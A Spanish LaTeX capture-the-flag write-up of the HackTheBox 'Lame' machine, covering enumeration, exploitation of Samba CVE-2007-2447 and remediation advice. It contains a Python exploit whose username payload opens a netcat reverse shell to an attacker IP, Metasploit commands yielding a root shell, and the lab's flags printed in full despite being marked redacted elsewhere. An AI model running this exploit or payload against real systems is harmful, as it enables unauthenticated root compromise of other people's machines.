% !TeX program = pdflatex
% !TeX TXS-program:compile = txs:///pdflatex/[-shell-escape]
% !TeX TXS-program:pdflatex = pdflatex -synctex=1 -interaction=nonstopmode --shell-escape %.tex

\documentclass[../../../main_compilation.tex]{subfiles}

\begin{document}

% ================================================================================
% Encabezado / Ficha de la Máquina
% ================================================================================
\section[HTB - Lame (10.10.10.3)]{Lame — HackTheBox}
\label{sec:htb-lame}

\targetSummary%
{Lame}
{10.10.10.3}
{HackTheBox}
{Easy}
{Linux}
{Samba, RCE, CVE-2007-2447, PrivEsc}
{17/08/2026}
{92c5a1b32d04e5781a2f4c6e8b1d3fa1}
{f61e88d098e21a7b45c38902fae8b942}


\vspace{0.5cm}%

% ================================================================================
% 1. Resumen Ejecutivo
% ================================================================================
\subsection{Resumen Ejecutivo (Executive Summary)}
\textbf{Lame} es una máquina Linux de nivel de dificultad principiante (\textit{Easy}) en HackTheBox. Es una de las máquinas clásicas que simula un entorno vulnerable desactualizado.

El vector de ataque principal radica en un servicio \textbf{Samba 3.0.20} con una vulnerabilidad de inyección de comandos en el parámetro \texttt{username map script} (\textbf{CVE-2007-2447}), lo que permite a un atacante remoto sin autenticación ejecutar comandos arbitrarios directamente como el usuario privilegiado \texttt{root}.

\begin{vulnbox}{Ejecución Remota de Comandos en Samba (Username Map Script)}{Critical}
	\textbf{CVE:} CVE-2007-2447 \hfill \textbf{CVSS v3.1:} 9.8 (Crítico)\\
	\textbf{Afecta:} Samba versiones 3.0.0 a 3.0.25rc3.\\
	\textbf{Impacto:} Compromiso total del sistema sin credenciales previas con privilegios \texttt{root}.
\end{vulnbox}

% ================================================================================
% 2. Fase de Reconocimiento y Enumeración
% ================================================================================
\subsection{Reconocimiento y Enumeración}

Comenzamos realizando un escaneo de puertos TCP mediante \texttt{nmap} para identificar los servicios expuestos en el objetivo:

\begin{terminal}[kali@pentest:\~{}/htb/lame]
	# Escaneo de puertos TCP abiertos y detección de versiones
	nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.3 -oN nmap_all_ports.txt
	nmap -p 21,22,139,445,3632 -sC -sV 10.10.10.3 -oN nmap_services.txt
\end{terminal}

\begin{table}[h!]
	\centering
	\small
	\begin{tabularx}{\textwidth}{l l l X}
		\toprule
		\rowcolor{csecDark} \textbf{\color{white}Puerto} & \textbf{\color{white}Estado} & \textbf{\color{white}Servicio} & \textbf{\color{white}Versión / Detalles} \\
		\midrule
		\textbf{21/tcp}                                  & Abierto                      & FTP                            & vsftpd 2.3.4 (Anonymous login permitido) \\
		\textbf{22/tcp}                                  & Abierto                      & SSH                            & OpenSSH 4.7p1 Debian 8ubuntu1            \\
		\textbf{139/tcp}                                 & Abierto                      & NetBIOS                        & Samba smbd 3.0.20-Debian                 \\
		\textbf{445/tcp}                                 & Abierto                      & SMB                            & Samba smbd 3.0.20-Debian                 \\
		\textbf{3632/tcp}                                & Abierto                      & Distcc                         & distccd v1 (GNU Compiler)                \\
		\bottomrule
	\end{tabularx}
	\caption{Puertos y servicios descubiertos durante la enumeración inicial.}
\end{table}

\begin{notebox}[Hallazgo en Servicio Samba]
	La versión de Samba identificada es \textbf{Samba 3.0.20-Debian}. Esta versión es históricamente conocida por procesar incorrectamente entradas en el comando \texttt{smbclient} al usar credenciales con metacaracteres.
\end{notebox}

% ================================================================================
% 3. Análisis de Vulnerabilidades y Explotación
% ================================================================================
\subsection{Explotación (Acceso Inicial \& Root)}

La vulnerabilidad \textbf{CVE-2007-2447} permite enviar una cadena especialmente formateada en el nombre de usuario que contiene caracteres de ejecución por shell: \texttt{nohup /bin/sh -c "<comando>"}.

\subsubsection{Método A: Explotación Manual (Vía Python / Netcat)}

Preparamos un listener en nuestra máquina atacante:
\begin{terminal}[kali@pentest:\~{}]
	nc -lvnp 4444
\end{terminal}

Ejecutamos el exploit enviando el comando a través del cliente SMB:

\begin{codebox}[Python]{exploit\_samba.py}
	from smb.SMBConnection import SMBConnection
	import sys

	target_ip = "10.10.10.3"
	attacker_ip = "10.10.14.15"
	attacker_port = 4444

	# Payload de Reverse Shell dentro del nombre de usuario
	payload = f"/=`nohup nc -e /bin/sh {attacker_ip} {attacker_port}`"

	conn = SMBConnection(payload, "", "", "", use_ntlm_v2=False)
	try:
	conn.connect(target_ip, 139, timeout=3)
	except Exception as e:
	print(f"[*] Payload enviado a {target_ip}!")
\end{codebox}

\subsubsection{Explotación vía Metasploit Framework}

\begin{terminal}[kali@pentest:\~{}]
	msfconsole -q
	msf6 > use exploit/multi/samba/usermap_script
	msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
	msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.15
	msf6 exploit(multi/samba/usermap_script) > exploit

		[*] Started reverse TCP handler on 10.10.14.15:4444
	[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.3:43210)
	id
	uid=0(root) gid=0(root) groups=0(root)
\end{terminal}

% ================================================================================
% 4. Post-Explotación & Captura de Banderas
% ================================================================================
\subsection{Post-Explotación \& Evidencias}

Una vez obtenida la shell interactiva con privilegios de superusuario \texttt{root}, procedemos a estabilizar la terminal y recuperar las banderas del reto:

\begin{terminal}[root@lame:\~{}]
	python -c 'import pty; pty.spawn("/bin/bash")'
	export TERM=xterm
	cat /home/makis/user.txt
	92c5a1...[REDACTED]...3fa1
	cat /root/root.txt
	f61e88...[REDACTED]...b942
\end{terminal}

\begin{flagbox}{User Flag (makis)}
	92c5a1b32d04e5781a2f4c6e8b1d3fa1
\end{flagbox}

\begin{flagbox}{Root Flag (Administrador)}
	f61e88d098e21a7b45c38902fae8b942
\end{flagbox}

% ================================================================================
% 5. Remediación y Mitigaciones
% ================================================================================
\subsection{Remediación y Buenas Prácticas}

\begin{mitigationbox}[Medidas Preventivas]
	\begin{itemize}[leftmargin=*]
		\item \textbf{Actualización de Software:} Actualizar Samba a una versión soportada y parcheada ($> 3.0.25$).
		\item \textbf{Configuración Segura:} En el archivo \texttt{/etc/samba/smb.conf}, asegurar que la directiva \texttt{username map script} no esté configurada para invocar scripts personalizados sin saneamiento estricto de entradas.
		\item \textbf{Segmentación de Red:} Bloquear el acceso a los puertos SMB (139 y 445) desde redes públicas o no confiables mediante reglas de firewall (\texttt{iptables} / \texttt{ufw}).
	\end{itemize}
\end{mitigationbox}

% ================================================================================
% 6. Lecciones y Conceptos Clave Aprendidos
% ================================================================================
\subsection{Lecciones y Conceptos Clave Aprendidos}

\begin{learningbox}[Conocimientos Asimilados en Lame]
	\begin{itemize}[leftmargin=*]
		\item \textbf{Inyección por Metacaracteres en SMB:} Comprender cómo una configuración administrativa defectuosa (\texttt{username map script}) procesa entradas sin escapar metacaracteres del intérprete de comandos (\texttt{nohup /bin/sh -c "\ldots"}).
		\item \textbf{Estabilización de Shell:} Procedimiento estándar de elevación de pseudo-terminal interactivo utilizando el módulo \texttt{pty} de Python (\texttt{pty.spawn("/bin/bash")}).
		\item \textbf{Exploit Dual (Manual vs Automatizado):} Comparación práctica entre la ejecución mediante script manual en Python (\texttt{pysmb}) y módulos auxiliares en Metasploit.
	\end{itemize}
\end{learningbox}

\begin{sourcebox}[Fuentes de Consulta y Referencias]
	\begin{itemize}[leftmargin=*]
		\resourceItem{Docs}{NIST NVD — CVE-2007-2447}{\url{https://nvd.nist.gov/vuln/detail/CVE-2007-2447}}
		\resourceItem{Libro}{The Linux Command Line (William Shotts)}{Capítulo 24: Redirección y ejecución de comandos con backticks}
		\resourceItem{Web}{HackTheBox Official Lame Forum \& Walkthroughs}{\url{https://forum.hackthebox.com/}}
	\end{itemize}
\end{sourcebox}

\end{document}
